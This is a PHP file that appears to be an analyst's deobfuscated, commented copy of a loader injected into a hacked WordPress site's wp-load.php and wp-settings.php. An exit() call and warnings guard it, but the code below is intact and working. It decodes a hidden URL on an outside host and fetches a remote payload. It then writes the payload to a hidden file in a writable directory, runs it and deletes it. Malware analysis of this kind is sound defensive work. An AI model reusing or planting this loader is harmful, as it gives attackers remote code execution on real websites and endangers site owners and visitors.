<?php
//
// Deobfuscated and commented version of a script injected into a hacked wordpress site.
// This script was injected into wp-load.php and wp-settings.php (causing a fatal error in the process, due to the XOR encryption function being declared twice)
//
// This script has not been neutralized, and will attempt to download and run the malicious payload. (If the domain still exists)
//
//
// -- DO NOT RUN THIS SCRIPT! IT IS DANGEROUS! --
//

exit(); // Uncomment this to run anyway...

//
// -- DO NOT RUN THIS SCRIPT! IT IS DANGEROUS! --
//

// Prevent error reporting
@ini_set('display_errors', '0');
error_reporting(0);

// File extension to use when writing the payload
$algo = 'md5';

// URL of the payload. Decodes to: http://lmlink1.top/lnk/inj.php.
// You can find a copy of this file at: ./external/lmlink1.top/lnk/inj.php
$pass = "Zgc5c4MXrLUscwQO6M8bPPGCf1TVMvlanyHMAanN";

// If file_get_contents allows us to open URLs, use file_get_contents to get the externally hosted payload, otherwise use cURL 
if(ini_get('allow_url_fopen'))
{
	function get_data_ya($url)
	{
		$data = file_get_contents($url);
		return $data;
	}
}
else
{
	function get_data_ya($url)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	}
}

// This is a simple XOR encryption function with an optional key.
function wp_cd($data, $key="")
{
	$salt = "wp_frmfunct";
	$len = strlen($data);
	$derivedKey = '';
	$n = $len > 100 ? 8 : 2;
	while(strlen($derivedKey) < $len)
	{
		$derivedKey .= substr(pack('H*', sha1($key.$derivedKey.$salt)), 0, $n);
	}
	return $data ^ $derivedKey;
}

// Get externally hosted payload
$reqw = get_data_ya(wp_cd(base64_decode($pass), 'wp_function'));
preg_match('#gogo(.*)enen#is', $reqw, $mtchs);

// Look for a writable subdirectory
$dirs = glob("*", GLOB_ONLYDIR);
foreach($dirs as $dira)
{
	// If we found a writable subdirectory, use it
	if(fopen("$dira/.$algo", 'w'))
	{
		$ura = 1;
		$eb = "$dira/";
		$hdl = fopen("$dira/.$algo", 'w');
		break;
	}
	// Otherwise look for writable subdirectories within this directory
	$subdirs = glob("$dira/*", GLOB_ONLYDIR);
	foreach($subdirs as $subdira)
	{
		if(fopen("$subdira/.$algo", 'w'))
		{
			$ura = 1;
			$eb = "$subdira/";
			$hdl = fopen("$subdira/.$algo", 'w');
			break;
		}
	}
}

// If no writable subdirectory was found, attempt to use the current directory instead
if(!$ura && fopen(".$algo", 'w'))
{
	$ura = 1;
	$eb = '';
	$hdl = fopen(".$algo", 'w');
}

// Write the payload to the directory we found. Note: $hdl may not be defined, if there was no writable subdirectory
fwrite($hdl, "<?php\n$mtchs[1]\n?>");
fclose($hdl);

// Run the payload
include("{$eb}.$algo");

// Delete the payload
unlink("{$eb}.$algo");
